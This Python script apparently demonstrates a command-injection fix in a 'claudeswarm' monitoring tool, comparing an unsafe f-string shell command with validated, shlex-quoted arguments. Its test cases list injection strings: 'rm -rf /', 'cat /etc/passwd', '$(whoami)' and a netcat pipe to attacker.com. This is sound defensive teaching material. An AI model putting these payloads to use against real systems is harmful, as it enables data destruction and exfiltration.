#!/usr/bin/env python3
"""
Demonstration script showing how the security fix prevents command injection.

This script demonstrates the difference between vulnerable and secure code
by showing how various injection attempts are now blocked.

Author: Agent-SecurityFix
"""

import shlex
from enum import Enum


class MessageType(Enum):
    """Valid message types."""
    QUESTION = "QUESTION"
    REVIEW_REQUEST = "REVIEW-REQUEST"
    BLOCKED = "BLOCKED"
    COMPLETED = "COMPLETED"
    CHALLENGE = "CHALLENGE"
    INFO = "INFO"
    ACK = "ACK"


def vulnerable_code(filter_type, filter_agent):
    """VULNERABLE: Demonstrates the old, unsafe code (DO NOT USE)."""
    print("\n" + "="*70)
    print("VULNERABLE CODE (BEFORE FIX)")
    print("="*70)

    # This is what the code USED to do (vulnerable)
    cmd = f"cd /project && python -m claudeswarm.monitoring"

    if filter_type:
        cmd += f" --filter-type {filter_type}"  # UNSAFE!
    if filter_agent:
        cmd += f" --filter-agent {filter_agent}"  # UNSAFE!

    print(f"\nConstructed command:\n{cmd}")
    print("\n⚠️  WARNING: This command would be executed in a shell!")
    print("⚠️  Injection attack would succeed!")


def secure_code(filter_type, filter_agent):
    """SECURE: Demonstrates the new, safe code with validation."""
    print("\n" + "="*70)
    print("SECURE CODE (AFTER FIX)")
    print("="*70)

    # Build command safely with validation
    cmd_parts = ['cd', shlex.quote("/project"), '&&', 'python', '-m', 'claudeswarm.monitoring']

    # Validate filter_type
    if filter_type:
        try:
            MessageType(filter_type)
            cmd_parts.extend(['--filter-type', shlex.quote(filter_type)])
            print(f"\n✅ filter_type '{filter_type}' validated and escaped")
        except ValueError:
            print(f"\n❌ ERROR: Invalid message type: {filter_type}")
            print(f"   Valid types: {', '.join(t.value for t in MessageType)}")
            print("   Command construction aborted!")
            return None

    # Validate filter_agent (simplified pattern check)
    if filter_agent:
        import re
        agent_pattern = re.compile(r'^[a-zA-Z0-9_-]+$')
        if agent_pattern.match(filter_agent) and not filter_agent.startswith('-') and not filter_agent.endswith('-'):
            cmd_parts.extend(['--filter-agent', shlex.quote(filter_agent)])
            print(f"✅ filter_agent '{filter_agent}' validated and escaped")
        else:
            print(f"\n❌ ERROR: Invalid agent ID: {filter_agent}")
            print(f"   Agent IDs must match pattern: ^[a-zA-Z0-9_-]+$")
            print("   Command construction aborted!")
            return None

    cmd = ' '.join(cmd_parts)
    print(f"\nConstructed command:\n{cmd}")
    print("\n✅ This command is safe - all inputs validated and escaped!")
    return cmd


def main():
    """Run demonstration of injection prevention."""
    print("="*70)
    print("COMMAND INJECTION VULNERABILITY FIX DEMONSTRATION")
    print("="*70)

    # Test cases
    test_cases = [
        {
            "name": "Test 1: Legitimate Usage",
            "filter_type": "INFO",
            "filter_agent": "agent-1",
            "expected": "PASS"
        },
        {
            "name": "Test 2: Command Injection via filter_type",
            "filter_type": "INFO && rm -rf /",
            "filter_agent": None,
            "expected": "BLOCKED"
        },
        {
            "name": "Test 3: Command Injection via filter_agent",
            "filter_type": None,
            "filter_agent": "agent-1; cat /etc/passwd",
            "expected": "BLOCKED"
        },
        {
            "name": "Test 4: Command Substitution Attack",
            "filter_type": "INFO$(whoami)",
            "filter_agent": None,
            "expected": "BLOCKED"
        },
        {
            "name": "Test 5: Pipe Attack",
            "filter_type": None,
            "filter_agent": "agent-1 | nc attacker.com 1234",
            "expected": "BLOCKED"
        },
    ]

    for test_case in test_cases:
        print("\n\n" + "="*70)
        print(f"{test_case['name']}")
        print("="*70)
        print(f"filter_type: {test_case['filter_type']}")
        print(f"filter_agent: {test_case['filter_agent']}")
        print(f"Expected: {test_case['expected']}")

        # Show vulnerable code behavior
        vulnerable_code(test_case['filter_type'], test_case['filter_agent'])

        # Show secure code behavior
        result = secure_code(test_case['filter_type'], test_case['filter_agent'])

        # Verify expected behavior
        if test_case['expected'] == "PASS":
            if result:
                print("\n✅ TEST PASSED: Legitimate input accepted")
            else:
                print("\n❌ TEST FAILED: Legitimate input rejected!")
        else:  # BLOCKED
            if result is None:
                print("\n✅ TEST PASSED: Attack blocked successfully")
            else:
                print("\n❌ TEST FAILED: Attack was not blocked!")

    print("\n\n" + "="*70)
    print("DEMONSTRATION COMPLETE")
    print("="*70)
    print("\nSummary:")
    print("• The vulnerable code would execute malicious commands")
    print("• The secure code validates inputs and escapes shell arguments")
    print("• All injection attempts are now blocked")
    print("• Legitimate usage continues to work correctly")
    print("\n✅ The fix successfully prevents command injection attacks!")


if __name__ == "__main__":
    main()
